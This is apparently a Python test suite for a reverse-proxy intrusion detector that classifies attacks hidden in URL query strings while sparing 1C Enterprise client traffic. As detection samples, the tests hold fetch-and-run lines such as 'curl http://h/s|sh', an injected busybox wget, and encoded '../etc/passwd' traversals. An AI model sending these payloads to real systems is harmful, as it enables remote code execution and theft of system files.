"""The attack that lives in the query string, which nothing used to read.

normalize_path throws the query away before anything looks at it, for a good
reason: the access log genuinely contains ?token=... and a security database
is the last place that belongs. But of 837,733 requests replayed from a live
gateway, 11,413 carried their whole attack there and the engine saw none of
it.

The obvious fix would have been a disaster. Treating ?cmd= as an attack looks
reasonable until you count: 73 of the 74 addresses sending ?cmd= on that
gateway were 1C Enterprise clients, whose web protocol puts cmd= in every
single request. The parameter name carries no information at all.

So the rules match the value, and only shapes with no legitimate reading. On
the same traffic they fired on 17 addresses, every one answered 404/451/423,
not one served, and not one of them caught by the path signatures --
/setup.cgi, /device.rsp, /remote/fgt_lang.
"""

from __future__ import annotations

import importlib.util
import json
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
FILES = ROOT / "ansible" / "roles" / "haproxy-admin" / "files"
GUARDD = FILES / "easy-ha-proxy-guardd.py"
SIGNATURES = FILES / "scanner-signatures.json"


def load():
    spec = importlib.util.spec_from_file_location("guardd_query", GUARDD)
    module = importlib.util.module_from_spec(spec)
    sys.modules["guardd_query"] = module
    spec.loader.exec_module(module)
    return module


guardd = load()


class TheOneClassOfFalsePositiveThatMatters(unittest.TestCase):
    """A rule on the parameter name would ban every 1C user on the gateway."""

    def test_the_1c_web_client_is_not_an_attacker(self):
        for uri in (
            "/114-b9e59390-2b55-11f0-bbf0-00155d35f506-474/e1cib/?cmd=sysver",
            "/e1csys?cmd=runApp&clientID=7",
            "/097-c3a64edd/e1cib/logForm?cmd=open",
        ):
            with self.subTest(uri=uri):
                self.assertEqual(guardd.classify_query(uri), "")

    def test_ordinary_query_strings_are_left_alone(self):
        for uri in (
            "/api/items?sort=name&page=2",
            "/search?q=curling+irons",       # 'curl' without the space
            "/reset?token=abc123def456",
            "/x?path=/usr/share/doc",        # a path, not /bin/sh
            "/",
            "/no-query",
            "",
        ):
            with self.subTest(uri=uri):
                self.assertEqual(guardd.classify_query(uri), "")


class WhatTheRulesCatch(unittest.TestCase):
    def test_a_fetch_and_run(self):
        for uri in ("/x?cmd=wget http://1.2.3.4/b", "/x?a=;busybox+wget",
                    "/cgi?x=curl http://h/s|sh"):
            with self.subTest(uri=uri):
                self.assertTrue(guardd.classify_query(uri))

    def test_a_traversal_chain(self):
        for uri in ("/x?f=../../../../etc/passwd",
                    "/download?p=%2e%2e%2f%2e%2e%2fetc",
                    "/x?f=..%2f..%2fetc/passwd"):
            with self.subTest(uri=uri):
                self.assertEqual(guardd.classify_query(uri), "traversal")

    def test_one_level_of_extra_encoding_does_not_hide_it(self):
        # %252e%252e is the same attack wearing one more coat.
        uri = "/x?f=%252e%252e%252f%252e%252e%252fetc/passwd"
        self.assertEqual(guardd.classify_query(uri), "traversal")

    def test_decoding_stops_before_it_starts_inventing_requests(self):
        self.assertLessEqual(guardd.QUERY_DECODE_PASSES, 2)

    def test_a_long_query_is_bounded(self):
        # A hostile query can be made megabytes long.
        guardd.classify_query("/x?a=" + "b" * 100000)
        self.assertLessEqual(guardd.MAX_QUERY_LENGTH, 8192)


class TheValueNeverLeaves(unittest.TestCase):
    """The query is dropped for a reason; a rule must not put it back."""

    def test_classify_query_returns_a_rule_name_not_the_match(self):
        secret = "s3cr3t-token-value"
        verdict = guardd.classify_query(f"/x?token={secret}&f=../../etc/passwd")
        self.assertEqual(verdict, "traversal")
        self.assertNotIn(secret, verdict)

    def test_the_parsed_request_carries_the_verdict_not_the_query(self):
        source = GUARDD.read_text(encoding="utf-8")
        self.assertIn("query_flag: str = \"\"", source)
        self.assertIn("query_flag=classify_query(uri)", source)
        # No field anywhere holds the query itself.
        self.assertNotIn("query: str", source)

    def test_the_emitted_detail_is_the_path(self):
        source = GUARDD.read_text(encoding="utf-8")
        block = source.split("if request.query_flag:")[1].split(
            "category = classify_path")[0]
        self.assertIn("detail=request.path", block)
        self.assertNotIn("detail=request.query", block)


class HowItScores(unittest.TestCase):
    def test_it_weighs_the_same_as_a_decisive_path(self):
        weight = guardd.DEFAULT_WEIGHTS[guardd.EVENT_QUERY_INJECTION]
        self.assertGreaterEqual(weight, guardd.WOULD_BAN_SCORE)

    def test_a_served_response_does_not_excuse_it(self):
        # A path the site answers is evidence the path is real. An injection
        # the site answered 200 is evidence it may have worked, which is the
        # opposite of a reason to let the client alone.
        source = GUARDD.read_text(encoding="utf-8")
        block = source.split("if request.query_flag:")[1].split(
            "category = classify_path")[0]
        code = " ".join(
            line for line in block.splitlines()
            if not line.strip().startswith("#")
        )
        self.assertIn("EVENT_QUERY_INJECTION", code)
        self.assertNotIn("is_served", code)

    def test_it_is_emitted_under_its_own_fingerprint(self):
        source = GUARDD.read_text(encoding="utf-8")
        self.assertIn(
            'fingerprint=f"{ip}|{EVENT_QUERY_INJECTION}|{request.query_flag}"',
            source,
        )


class TheRulesAreReplaceable(unittest.TestCase):
    """Like the paths, and for the same reason: this changes faster than we do."""

    def setUp(self):
        self.addCleanup(guardd.load_signatures, str(SIGNATURES))
        guardd.load_signatures(str(SIGNATURES))

    def test_the_shipped_file_carries_them(self):
        data = json.loads(SIGNATURES.read_text(encoding="utf-8"))
        self.assertTrue(data.get("queries"))
        self.assertEqual(len(guardd.QUERY_RULES), len(data["queries"]))

    def test_a_bad_regex_does_not_take_the_daemon_with_it(self):
        data = json.loads(SIGNATURES.read_text(encoding="utf-8"))
        data["queries"] = {"broken": "([unclosed"}
        with tempfile.NamedTemporaryFile(
            "w", suffix=".json", delete=False, encoding="utf-8"
        ) as handle:
            json.dump(data, handle)
            broken = handle.name
        self.addCleanup(lambda: Path(broken).unlink(missing_ok=True))
        # The rest of the file is still good, so it loads; the rules fall
        # back rather than leaving the daemon with nothing.
        guardd.load_signatures(broken)
        self.assertEqual(guardd.classify_query("/x?f=../../etc/passwd"),
                         "traversal")


if __name__ == "__main__":
    unittest.main()
